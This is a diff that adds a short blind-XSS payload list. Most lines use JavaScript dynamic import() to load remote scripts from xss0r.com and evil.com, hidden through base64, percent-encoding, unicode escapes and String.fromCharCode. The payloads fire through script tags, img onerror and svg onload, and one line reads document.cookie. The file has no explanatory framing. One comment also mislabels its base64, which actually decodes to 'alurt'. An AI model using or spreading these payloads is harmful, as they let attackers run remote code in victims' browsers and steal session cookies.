@@ -1,1 +1,13 @@
+BXSS
 
+
+import('data:text/javascript;base64,YWx1cnQoJ1hTUyEnKQ==') // Base64 → alert('XSS!')
+import('data:text/javascript,%61lert(document.cookie)') // %61 = 'a'
+<script type="module">import('https://xss0r.com/c/toxin');</script>
+<img src=x onerror="import('https://xss0r.com/c/toxin')">
+<svg/onload="import('https://xss0r.com/c/toxin')">
+(() => { import('https://xss0r.com/c/toxin') })()
+import(/*trick*/'https://xss0r.com/c/toxin')
+\u0069\u006d\u0070\u006f\u0072\u0074('https://evil.com/payload.js') //Equivalent to: import('https://evil.com/payload.js')
+<script>import(String.fromCharCode(
+104,116,112,115,58,47,47,101,118,105,108,46,99,111,109,47,112,97,121,46,106,115)); //Equivalent to: import('https://evil.com/pay.js')</script>
